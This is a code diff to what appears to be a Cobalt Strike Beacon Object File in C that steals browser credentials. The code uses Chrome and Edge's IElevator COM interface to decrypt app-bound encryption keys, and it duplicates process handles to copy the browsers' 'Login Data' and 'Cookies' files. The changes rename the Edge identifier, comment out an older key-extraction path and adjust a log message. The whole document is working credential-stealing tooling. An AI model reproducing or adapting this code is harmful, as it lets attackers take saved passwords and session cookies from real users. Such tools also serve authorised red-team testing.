@@ -268,7 +268,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     if (MSVCRT$strcmp(browser, "chrome") == 0){
         hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&chromeElevator);
     }
-    if (MSVCRT$strcmp(browser, "edge") == 0){
+    if (MSVCRT$strcmp(browser, "msedge") == 0){
         hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&edgeElevator);
     }
     if (FAILED(hr)) {
@@ -289,7 +289,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
             EOAC_DYNAMIC_CLOAKING
         );
     }
-    if (MSVCRT$strcmp(browser, "edge") == 0) {
+    if (MSVCRT$strcmp(browser, "msedge") == 0) {
         hr = OLE32$CoSetProxyBlanket(
             (IUnknown *) edgeElevator,
             RPC_C_AUTHN_DEFAULT,
@@ -333,7 +333,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     if (MSVCRT$strcmp(browser, "chrome") == 0){
         hr = chromeElevator->lpVtbl->DecryptData(chromeElevator,ciphertext_data, &plaintext_data, &last_error);
     }
-    if (MSVCRT$strcmp(browser, "edge") == 0){
+    if (MSVCRT$strcmp(browser, "msedge") == 0){
         hr = edgeElevator->lpVtbl->DecryptData(edgeElevator,ciphertext_data, &plaintext_data, &last_error);
     }
     // return decrypted key
@@ -371,25 +371,26 @@ VOID GetEncryptionKey(char * browser) {
         localStatePath = "\\Google\\Chrome\\User Data\\Local State";
     }
 
-    //get chrome key
-    CHAR *data = GetFileContent(localStatePath);
-    CHAR *key = NULL;
+    // commented out for now, as it is not needed with the use of app bound encryption
+    // get chrome key
+    // CHAR *data = GetFileContent(localStatePath);
+    // CHAR *key = NULL;
 
-    if(data == NULL) {
-        BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
-        return;
-    }
-    //BeaconPrintf(CALLBACK_OUTPUT, "Got Chrome Local State File");
-    // extract CHAR pattern[] = "\"encrypted_key\":\""; from file
-    CHAR pattern[] = "\"encrypted_key\":\"";
-    key = ExtractKey(data, pattern);
-    KERNEL32$GlobalFree(data);
-    if(key == NULL) {
-        BeaconPrintf(CALLBACK_ERROR,"getting the key failed.\n");
-        return;
-    }
-    //BeaconPrintf(CALLBACK_OUTPUT, "Got Chrome Key ");
-    GetMasterKey(key);
+    // if(data == NULL) {
+    //     BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
+    //     return;
+    // }
+    // //BeaconPrintf(CALLBACK_OUTPUT, "Got Chrome Local State File");
+    // // extract CHAR pattern[] = "\"encrypted_key\":\""; from file
+    // CHAR pattern[] = "\"encrypted_key\":\"";
+    // key = ExtractKey(data, pattern);
+    // KERNEL32$GlobalFree(data);
+    // if(key == NULL) {
+    //     BeaconPrintf(CALLBACK_ERROR,"getting the key failed.\n");
+    //     return;
+    // }
+    // //BeaconPrintf(CALLBACK_OUTPUT, "Got Chrome Key ");
+    // GetMasterKey(key);
 
     CHAR *app_key = NULL;
     CHAR *app_data = GetFileContent(localStatePath);
@@ -706,7 +707,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
                         //BeaconPrintf(CALLBACK_OUTPUT, "%d\n", MSVCRT$strlen(handleName));
                         if (MSVCRT$strstr(handleName, browserFile) != NULL && (MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 4], "Data") == 0 || MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 7], "Cookies") == 0)){
 
-                            BeaconPrintf(CALLBACK_OUTPUT,"%s WAS FOUND\n", browserFile);
+                            BeaconPrintf(CALLBACK_OUTPUT,"Handle to %s Was FOUND with PID: %lu\n", browserFile, PID);
                             //BeaconPrintf(CALLBACK_OUTPUT, "Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
 
                             KERNEL32$SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
